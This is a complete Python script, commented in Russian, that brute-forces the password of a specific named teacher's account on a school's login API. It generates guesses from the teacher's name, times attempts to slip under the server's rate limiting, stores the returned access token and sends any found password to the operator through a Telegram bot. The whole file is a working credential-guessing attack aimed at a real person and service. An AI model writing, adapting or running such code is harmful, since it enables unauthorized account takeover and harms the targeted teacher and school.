#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
rs-brute — перебор пароля к аккаунту учителя на api.rahimovschool.uz
Работает на Render (бесплатный план) + Telegram-бот для управления.
"""
import argparse
import json
import logging
import os
import random
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from candidates import build_candidates

# ---------- конфиг ----------
API_BASE   = os.getenv("API_BASE", "https://api.rahimovschool.uz").rstrip("/")
LOGIN_PATH = os.getenv("LOGIN_PATH", "/api/v1/auth/login/")
LOGIN_URL  = API_BASE + LOGIN_PATH
USERNAME   = os.getenv("TARGET_USERNAME", "jumanazarmirzatillayev")
FIRST_NAME = os.getenv("TARGET_FIRST", "Jumanazar")
LAST_NAME  = os.getenv("TARGET_LAST", "Mirzatillayev")

TG_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TG_CHAT  = os.getenv("TELEGRAM_CHAT_ID", "").strip()

STATE_FILE = os.getenv("STATE_FILE", "state.json")
PORT = int(os.getenv("PORT", "10000"))
EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL", "").rstrip("/")
SELF_PING_SECS = int(os.getenv("SELF_PING_SECS", "600"))

WINDOW_MAX   = int(os.getenv("WINDOW_MAX", "5"))      # попыток за окно
WINDOW_SECS  = int(os.getenv("WINDOW_SECS", "905"))   # длина окна, сек
RETRY_BUFFER = int(os.getenv("RETRY_BUFFER", "10"))   # запас после 429
STEP_SLEEP   = float(os.getenv("STEP_SLEEP", "2.5"))  # пауза между попытками

TG_URL = f"https://api.telegram.org/bot{TG_TOKEN}" if TG_TOKEN else None

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    stream=sys.stdout,
)
log = logging.getLogger("rs-brute")

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (compatible; rs-brute/1.0; +render)",
    "Content-Type": "application/json",
})

# ---------- состояние ----------
state_lock = threading.Lock()
STATE = {
    "index": 0,
    "tested": 0,
    "found": None,
    "token": None,
    "paused": False,
    "stop": False,
    "window_count": 0,
    "window_start": 0.0,
    "started_at": time.time(),
    "last_attempt_ts": 0.0,
    "throttled_until": 0.0,
    "total_429": 0,
}

def load_state():
    global STATE
    try:
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            s = json.load(f)
        for k in s:
            if k in STATE:
                STATE[k] = s[k]
        log.info("state loaded: index=%d tested=%d found=%s",
                 STATE["index"], STATE["tested"], STATE["found"])
    except FileNotFoundError:
        STATE["window_start"] = time.time()
        log.info("no state file; fresh start")
    except Exception as e:
        log.warning("load state failed: %s", e)

def save_state():
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as f:
            json.dump(STATE, f, ensure_ascii=False, indent=2)
    except Exception as e:
        log.warning("save state failed: %s", e)

# ---------- telegram ----------
def tg_send(text):
    if not TG_TOKEN or not TG_CHAT:
        print(f"[TG] {text}")
        return
    try:
        requests.post(TG_URL + "/sendMessage",
                      json={"chat_id": TG_CHAT, "text": text,
                            "parse_mode": "HTML", "disable_web_page_preview": True},
                      timeout=15)
    except Exception as e:
        log.warning("tg send failed: %s", e)

def tg_status():
    with state_lock:
        idx, tested = STATE["index"], STATE["tested"]
        found = STATE["found"]
        paused = STATE["paused"]
        stopped = STATE["stop"]
        found_at = None
    now = time.time()
    cands = CANDIDATES
    remaining = max(0, len(cands) - idx)
    windows = remaining / max(WINDOW_MAX, 1)
    eta_sec = windows * WINDOW_SECS
    h = int(eta_sec // 3600); m = int((eta_sec % 3600) // 60); s = int(eta_sec % 60)
    lines = [
        "<b>rs-brute status</b>",
        f"цель: <code>{USERNAME}</code>",
        f"проверено: {tested} / {len(cands)}",
        f"индекс: {idx}",
        f"пауза: {'да' if paused else 'нет'} | остановка: {'да' if stopped else 'нет'}",
        f"заглушек 429: {STATE['total_429']}",
    ]
    if found:
        lines.append(f"✅ НАЙДЕНО: <code>{found}</code>")
    else:
        lines.append(f"примерный ETA: {h}ч {m}м {s}с (~5 попыток / 15 мин)")
    tg_send("\n".join(lines))

# ---------- candidates ----------
CANDIDATES = build_candidates(FIRST_NAME, LAST_NAME, USERNAME,
                              os.getenv("WORDLIST"))
log.info("candidates: %d", len(CANDIDATES))

# ---------- login ----------
def try_login(password):
    """Возвращает ('ok', json) | ('invalid', None) | ('throttle', retry_after) | ('error', status)"""
    payload = {"username": USERNAME, "password": password}
    try:
        r = session.post(LOGIN_URL, json=payload, timeout=25)
    except requests.exceptions.RequestException as e:
        log.warning("request error: %s", e)
        return ("error", None)
    if r.status_code == 200:
        try:
            return ("ok", r.json())
        except Exception:
            return ("ok", {"raw": r.text})
    if r.status_code == 400:
        return ("invalid", None)
    if r.status_code == 429:
        retry = 900
        try:
            retry = int(r.json().get("retry_after", 900))
        except Exception:
            pass
        return ("throttle", retry)
    return ("error", r.status_code)

# ---------- worker ----------
def worker():
    log.info("worker started; %d candidates", len(CANDIDATES))
    while True:
        with state_lock:
            if STATE["stop"] or STATE["found"]:
                break
            if STATE["paused"]:
                cur = None
            else:
                idx = STATE["index"]
                if idx >= len(CANDIDATES):
                    cur = None  # done
                else:
                    cur = (idx, CANDIDATES[idx])
        if cur is None:
            if STATE["found"]:
                break
            if STATE["paused"]:
                time.sleep(2)
                continue
            log.info("candidates exhausted without result")
            tg_send("⚠️ Список кандидатов закончен, пароль не найден.")
            break

        idx, pw = cur
        now = time.time()

        # окно попыток
        with state_lock:
            if STATE["window_start"] <= 0:
                STATE["window_start"] = now
            ws = STATE["window_start"]
            wc = STATE["window_count"]
        if wc >= WINDOW_MAX:
            wait_until = ws + WINDOW_SECS
            if now < wait_until:
                with state_lock:
                    STATE["throttled_until"] = wait_until
                    save_state()
                log.info("window full; sleep %.0f s", wait_until - now)
                # спим кусками, проверяя паузу/стоп
                end = time.time() + (wait_until - now)
                while time.time() < end:
                    with state_lock:
                        if STATE["stop"] or STATE["found"]:
                            break
                        paused = STATE["paused"]
                    if paused:
                        time.sleep(2)
                        continue
                    time.sleep(min(10, end - time.time()))
                with state_lock:
                    STATE["window_count"] = 0
                    STATE["window_start"] = time.time()
                    STATE["throttled_until"] = 0
                    save_state()
                continue
            else:
                with state_lock:
                    STATE["window_count"] = 0
                    STATE["window_start"] = now
                    save_state()

        kind, info = try_login(pw)
        log.info("try %-28s -> %s %s", pw, kind, info if info != None else "")

        with state_lock:
            STATE["last_attempt_ts"] = now
            if kind == "ok":
                STATE["found"] = pw
                STATE["token"] = (info or {}).get("access_token")
                save_state()
                log.info("✅ FOUND: %s", pw)
                tg_send(f"🔑 <b>Пароль найден!</b>\nЛогин: <code>{USERNAME}</code>\nПароль: <code>{pw}</code>\ntoken_type=access")
                break
            elif kind == "invalid":
                STATE["tested"] += 1
                STATE["index"] = idx + 1
                STATE["window_count"] += 1
                save_state()
            elif kind == "throttle":
                STATE["total_429"] += 1
                ra = int(info or 900)
                wait = ra + RETRY_BUFFER
                STATE["throttled_until"] = now + wait
                # сброс окна, т.к. сервер сам выдал блокировку
                STATE["window_count"] = 0
                STATE["window_start"] = now + wait
                save_state()
                log.info("429 throttle; sleep %d s", wait)
                end = time.time() + wait
                while time.time() < end:
                    with state_lock:
                        if STATE["stop"] or STATE["found"]:
                            break
                        paused = STATE["paused"]
                    if paused:
                        time.sleep(2)
                        continue
                    time.sleep(min(15, end - time.time()))
                with state_lock:
                    STATE["throttled_until"] = 0
                    save_state()
            else:
                log.warning("error response; backoff 30s")
                time.sleep(30)

        if not STATE.get("paused") and not STATE.get("stop") and not STATE.get("found"):
            time.sleep(STEP_SLEEP)

# ---------- http health ----------
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split("?")[0]
        with state_lock:
            found = STATE["found"]
            idx = STATE["index"]
            tested = STATE["tested"]
            paused = STATE["paused"]
        if path == "/health":
            body = b"ok"
            code = 200
        elif path == "/":
            lines = [
                "rs-brute running",
                f"target: {USERNAME}",
                f"tested: {tested} / {len(CANDIDATES)}",
                f"index: {idx}",
                f"found: {found if found else 'no'}",
                f"paused: {paused}",
            ]
            body = "\n".join(lines).encode()
            code = 200
        elif path == "/status":
            body = json.dumps({
                "target": USERNAME, "tested": tested, "total": len(CANDIDATES),
                "index": idx, "found": found, "paused": paused,
            }).encode()
            code = 200
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
            return
        else:
            body = b"not found"
            code = 404
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass

def start_http():
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    log.info("http on :%d", PORT)
    srv.serve_forever()

# ---------- self-ping (чтобы Render не засыпал) ----------
def self_ping():
    if not EXTERNAL_URL:
        return
    while True:
        time.sleep(SELF_PING_SECS)
        try:
            requests.get(EXTERNAL_URL + "/health", timeout=15)
            log.debug("self-ping ok")
        except Exception as e:
            log.warning("self-ping failed: %s", e)

# ---------- telegram polling ----------
def tg_poll():
    if not TG_TOKEN or not TG_CHAT:
        return
    offset = 0
    log.info("tg polling started")
    while True:
        try:
            r = requests.get(TG_URL + "/getUpdates",
                             params={"timeout": 30, "offset": offset,
                                     "allowed_updates": '["message"]'},
                             timeout=45)
            for u in r.json().get("result", []):
                offset = u["update_id"] + 1
                msg = u.get("message", {})
                chat_id = str(msg.get("chat", {}).get("id"))
                text = msg.get("text", "").strip()
                if chat_id != TG_CHAT:
                    continue
                if not text:
                    continue
                handle_tg(text)
        except Exception as e:
            log.warning("tg poll error: %s", e)
            time.sleep(5)

def handle_tg(text):
    cmd = text.split()[0].lower() if text.split() else ""
    args = text.split()[1:]
    with state_lock:
        paused = STATE["paused"]
        stopped = STATE["stop"]
        found = STATE["found"]
        idx = STATE["index"]
        tested = STATE["tested"]

    if cmd == "/start":
        tg_send(f"🤖 rs-brute активен.\nЦель: <code>{USERNAME}</code>\nКоманды: /status /pause /resume /password /attempts /skip /test <пароль>")
    elif cmd == "/status":
        tg_status()
    elif cmd == "/pause":
        with state_lock:
            STATE["paused"] = True
            save_state()
        tg_send("⏸ пауза включена")
    elif cmd == "/resume":
        with state_lock:
            STATE["paused"] = False
            save_state()
        tg_send("▶️ пауза снята")
    elif cmd == "/password":
        if found:
            tg_send(f"🔑 Пароль: <code>{found}</code>")
        else:
            tg_send("❌ 아직 не найден")
    elif cmd == "/attempts":
        tg_send(f"проверено: {tested} / {len(CANDIDATES)} (индекс {idx})")
    elif cmd == "/skip":
        with state_lock:
            STATE["index"] = min(STATE["index"] + 1, len(CANDIDATES) - 1)
            save_state()
        tg_send("⏩ пропущено")
    elif cmd == "/test" and args:
        pw = args[0]
        kind, info = try_login(pw)
        if kind == "ok":
            with state_lock:
                STATE["found"] = pw
                STATE["token"] = (info or {}).get("access_token")
                save_state()
            tg_send(f"✅ /test подтвердил пароль: <code>{pw}</code>")
        else:
            tg_send(f"❌ /test не прошёл: {kind} {info}")
    else:
        tg_send("неизвестная команда: /status /pause /resume /password /attempts /skip /test <пароль>")

# ---------- main ----------
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list-only", action="store_true",
                    help="только вывести список кандидатов и выйти")
    ap.add_argument("--once", action="store_true",
                    help="сделать одну попытку и выйти (для отладки)")
    args = ap.parse_args()

    load_state()

    if args.list_only:
        for i, c in enumerate(CANDIDATES):
            print(i, c)
        return

    tg_send(f"🚀 rs-brute запущен.\nЦель: <code>{USERNAME}</code>\nКандидатов: {len(CANDIDATES)}\nОкно: {WINDOW_MAX} попыток / {WINDOW_SECS//60} мин")

    # фоновые потоки
    th_http = threading.Thread(target=start_http, daemon=True)
    th_http.start()
    th_ping = threading.Thread(target=self_ping, daemon=True)
    th_ping.start()
    th_tg = threading.Thread(target=tg_poll, daemon=True)
    th_tg.start()

    # основной поток — перебор
    try:
        if args.once:
            with state_lock:
                idx = STATE["index"]
            if idx < len(CANDIDATES):
                kind, info = try_login(CANDIDATES[idx])
                print(f"{CANDIDATES[idx]} -> {kind} {info}")
        else:
            worker()
    except KeyboardInterrupt:
        log.info("interrupted")
    finally:
        with state_lock:
            STATE["stop"] = True
            save_state()
        tg_send("⏹ rs-brute остановлен.")

if __name__ == "__main__":
    main()
